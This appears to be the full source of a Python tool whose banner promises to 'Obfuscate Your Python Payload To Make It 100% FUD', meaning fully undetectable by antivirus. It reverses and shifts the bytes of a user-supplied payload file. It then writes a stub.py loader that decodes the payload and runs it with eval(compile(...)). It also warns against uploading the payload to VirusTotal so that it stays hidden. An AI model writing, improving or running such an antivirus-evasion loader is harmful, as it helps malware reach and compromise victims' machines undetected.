import platform
import time
import os
print("[*] Checking Requirements Module.....\n")
if platform.system().startswith("Windows"):
    try:
        import colorama
        from colorama import Fore, Back, Style
    except ImportError:
        os.system("python -m pip install colorama -q -q -q")
        import colorama
        from colorama import Fore, Back, Style
    try:
        from pystyle import *
    except:
        os.system("python -m pip install pystyle -q -q -q")
        from pystyle import *
    try:
            import colored
    except ImportError:
            os.system("python -m pip install colored -q -q -q")
            import colored

elif platform.system().startswith("Linux"):
    try:
        import colored
    except ImportError:
        os.system("python3 -m pip install colored -q -q -q")
        import colored
    try:
        from pystyle import *
    except:
        os.system("python3 -m pip install pystyle -q -q -q")
        from pystyle import *
    try:
        import colorama
        from colorama import Fore, Back, Style
    except ImportError:
        os.system("python3 -m pip install colorama -q -q -q")
        import colorama
        from colorama import Fore, Back, Style
baner="""
      ****************************************************************************
      *      ______         ___  _      __                     _   _______       *
      *     / /  _ \ _   _ / _ \| |__  / _|_   _ ___  ___ __ _| |_|___ /\ \      *
      *    | || |_) | | | | | | | '_ \| |_| | | / __|/ __/ _` | __| |_ \ | |     * 
      *   < < |  __/| |_| | |_| | |_) |  _| |_| \__ \ (_| (_| | |_ ___) | > >    *
      *    | ||_|    \__, |\___/|_.__/|_|  \__,_|___/\___\__,_|\__|____/ | |     *
      *     \_\      |___/                                              /_/      *
      *                        Coded By:- Machine1337                            *
      *             <Obfuscate Your Python Payload To Make It 100% FUD>          *
      *                                                                          *
      ****************************************************************************
"""
def nullifysec(wit):
    wite = 0
    while wite < 3:
        witen = wit.copy()
        for witeo in range(len(wit)):
            witen[witeo] = wit[len(wit) - witeo - 1] - 3
        wit = witen
        wite += 1
    return wit
def maind():
    print()
    a= input(Fore.GREEN+'\n[*] Enter Path Of Payload File:- ')
    with open(a, "r") as file:
        lines = file.readlines()
    string = "".join(lines)
    print(Fore.GREEN+'\n[*] File Obfuscation Started !!! ')
    time.sleep(1)
    apple = string
    norton = bytearray(apple, "utf-8")
    norti = nullifysec(norton)
    print(Fore.RED+'\n[*] Do Not Submit Payload on VirusTotal!!!')
    time.sleep(2)
    aocpavEtoapcvnOc = norti.decode("utf-8")
    with open('stub.py', 'w') as f:
        f.write(f"""
import os
def aovcpeoTwvocpvTmcvna(aocpeaTeocpvTacva):
    aocpeaTneocpvTacva = 9
    while aocpeaTneocpvTacva > 6:
        aoccpeaTneocpvTacva = aocpeaTeocpvTacva.copy()
        for aovcpeaTneocpvTacva in range(len(aocpeaTeocpvTacva)):
            aoccpeaTneocpvTacva[aovcpeaTneocpvTacva] = aocpeaTeocpvTacva[len(aocpeaTeocpvTacva) - aovcpeaTneocpvTacva - 1] + 3
        aocpeaTeocpvTacva = aoccpeaTneocpvTacva
        aocpeaTneocpvTacva -= 1
    return aocpeaTeocpvTacva
aovcpeaTneocpvTacvna = r""\"{aocpavEtoapcvnOc}\"""
aovcpeoTneocpvTmcvna = bytearray(aovcpeaTneocpvTacvna, "utf-8")
aovcpeoTnvocpvTmcvna = aovcpeoTwvocpvTmcvna(aovcpeoTneocpvTmcvna)
aovcpeaTneocpvTmcvna = aovcpeoTnvocpvTmcvna.decode("utf-8")
eval(compile(aovcpeaTneocpvTmcvna,'<string>','exec'))
        """)
        f.close()
        print(Fore.GREEN+'\n[*] File Obfuscation Success!!!')

def catc():
    try:
        if platform.system().startswith("Windows"):
            print("\033c")
            print(Colorate.Vertical(Colors.green_to_yellow, baner, 2))
            maind()
        elif platform.system().startswith("Linux"):
            print("\033c")
            print(Colorate.Vertical(Colors.green_to_yellow, baner, 2))
            maind()
    except KeyboardInterrupt:
        print()
        print(Fore.RED+'\n[*] You Pressed the Exit Button!!!')
        quit()
catc()
